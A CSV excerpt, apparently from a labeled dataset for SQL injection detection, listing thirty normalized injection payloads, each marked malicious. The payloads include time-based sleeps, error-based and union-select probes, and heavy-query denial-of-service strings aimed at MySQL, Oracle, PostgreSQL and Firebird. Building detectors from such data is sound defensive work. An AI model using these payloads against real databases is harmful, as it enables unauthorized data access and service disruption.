row_index,payload_norm,label,sqli_type_hint
7650,"1' or elt ( 6272 = 6272,sleep ( 5 ) ) and 'vrim' = 'vrim",1,
7651,"-1139 ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
7652,"-7345%"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""%"" = """,1,
7653,"-7146"" where 6431 = 6431 or 8548 = 5549--",1,
7654,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- rucf",1,
7655,-1396 where 5838 = 5838 or 9323 = 9323#,1,
7656,"1"" ) where 5358 = 5358",1,
7657,1' ) where 4509 = 4509 union all select null--,1,
7658,"1 ) as caoa where 6139 = 6139 union all select null,null,null,null,null,null,null,null--",1,
7659,"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'bmzj' like 'bmzj",1,
7660,-9501' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 'mndw' = 'mndw,1,
7661,"1"" ) ) as ylah where 9248 = 9248",1,
7662,-4803%' ) ) or 8571 = 8571--,1,
7663,"1"" ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""bvdv"" like ""bvdv",1,
7664,"1'+ ( select 'qaar' where 7841 = 7841 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",1,
7665,"1"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""mhfc"" = ""mhfc",1,
7666,"1'+ ( select 'nzgq' where 7230 = 7230 and elt ( 1210 = 1210,sleep ( 5 ) ) ) +'",1,
7667,"-8034"" or 8571 = 8571--",1,
7668,1' ) where 5616 = 5616,1,
7669,select ( case when ( 5464 = 9350 ) then 5464 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
7670,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ""%"" = """,1,
7671,"-5145' where 2334 = 2334 union all select 2334,2334,2334,2334--",1,
7672,"-2168 ) union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",1,
7673,"-5245' or elt ( 1032 = 1032,3623 ) and 'qfvo' = 'qfvo",1,
7674,"-3581'|| ( select 'uxmh' from dual where 8954 = 8954 union all select 8954,8954,8954,8954,8954,8954#",1,
7675,-1385' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'mjjd' = 'mjjd,1,
7676,"1"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""xjdh"" = ""xjdh",1,
7677,1'+ ( select 'tbfj' where 4016 = 4016,1,
7678,"1%' ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
7679,"1"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1,
